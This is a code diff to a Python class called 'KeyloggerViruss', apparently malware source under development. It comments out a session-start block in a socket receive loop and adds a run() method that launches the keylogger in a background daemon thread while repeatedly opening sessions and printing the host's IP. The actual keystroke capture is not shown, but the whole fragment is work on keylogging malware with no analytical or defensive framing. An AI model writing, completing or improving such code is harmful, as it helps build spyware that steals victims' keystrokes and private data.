@@ -94,10 +94,10 @@ class KeyloggerViruss():
         try:
             while True:
                 try:
-                    if not self.is_active_server:
-                        self.start_session()
-                        print(self.ip_self)
-                        time.sleep(0.1)
+                    # if not self.is_active_server:
+                    #     self.start_session()
+                    #     print(self.ip_self)
+                    #     time.sleep(0.1)
 
                     try:
                         data, _ = sock.recvfrom(buffer_size)
@@ -126,3 +126,14 @@ class KeyloggerViruss():
         finally:
             sock.close()
             print("Socket closed. Bye.")
+
+
+    def run(self):
+        import threading
+        run_keylogger_thread = threading.Thread(target=self.run_keylogger, daemon=True)
+        run_keylogger_thread.start()
+
+        while self.is_active_server:
+            self.start_session()
+            print(self.ip_self)
+            time.sleep(0.1)
